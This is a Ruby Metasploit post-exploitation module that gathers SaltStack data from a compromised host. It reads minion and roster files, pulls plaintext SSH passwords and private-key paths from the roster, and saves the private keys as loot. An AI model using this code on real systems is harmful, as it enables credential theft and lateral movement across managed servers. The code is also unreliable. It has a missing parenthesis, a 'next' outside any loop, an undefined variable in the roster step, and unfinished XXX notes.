##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'SaltStack Information Gatherer',
        'Description'    => 'This module gathers information from SaltStack masters and minions',
        'Author'         => [
          'h00die',
          'c2Vlcgo'
        ],
        'SessionTypes'  => %w(shell meterpreter),
        'License'        => MSF_LICENSE,
      )
    )
  end

  def minion
    # XXX ask salt for minion file?
    [ '/usr/local/etc/salt/minion', # freebsd
      '/etc/salt/minion']. each do |config|
      next unless file?(config)
      minion = YAML.load(read_file(config))
      if minion['master']
        minion['master'].each do |master|
          print_good("Minion master: #{master}")
        end
      end
      store_path = store_loot('saltstack_minion', "application/x-yaml", session, minion.to_yaml, "minion.yaml", "SaltStack Minion File")
      print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
    end
  end

  def master
    # pull minions
    minions = YAML.load(cmd_exec('salt-key -L'))
    store_path = store_loot('saltstack_minions', "application/x-yaml", session, minions.to_yaml, "minions.yaml", "SaltStack salt-key list")
    print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
    # XXX check these
    if minions['accepted']
      print_good('Accepted minions')
      minions['accepted'].each do |minion|
        print_good("  #{minion}")
      end
    end
    if minions['unaccepted']
      print_status('Unaccepted minions')
      minions['unaccepted'].each do |minion|
        print_status("  #{minion}")
      end
    end
    if minions['rejected']
      print_bad('Rejected minions')
      minions['rejected'].each do |minion|
        print_bad("  #{minion}")
      end
    end
    if minions['denied']
      print_bad('Denied minions')
      minions['denied'].each do |minion|
        print_bad("  #{minion}")
      end
    end

    # get sls files
    cmd_exec("salt '*' state.show_sls '*'")
    # XXX do what with this info...

    # get roster
    # XXX ask salt where the roster file is
    # https://docs.saltstack.com/en/latest/topics/ssh/roster.html
    priv_to_retrieve = []
    config = '/etc/salt/roster'
    next unless file?(config)
    minions = YAML.load(read_file(config)
    minions.each do |minion|
      host = minion['host']
      user = minion['user']
      passwd = minion['passwd']
      sudo = minion['sudo'] || false
      priv = minion['priv'] || false
      unless priv_to_retrieve.include?priv
        priv_to_retrieve.append(priv)
      end
      priv_pass = minion['priv_passwd'] || false
      print_good("Minion master: #{minion['master']}")
    end
    store_path = store_loot('saltstack_roster', "application/x-yaml", session, minion.to_yaml, "roster.yaml", "SaltStack Roster File")
    print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
    priv_to_retrieve.each do |f|
      input = read_file(f)
      store_path = store_loot('ssh_key', "plain/txt", session, input, "salt-ssh.rsa", "SaltStack SSH Private Key")
      print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
    end
  end

  def run
    if session.platform == 'windows'
      fail_with(Failure::Unknown, 'This module does not support windows')
    end
    minion
    master
  end

end
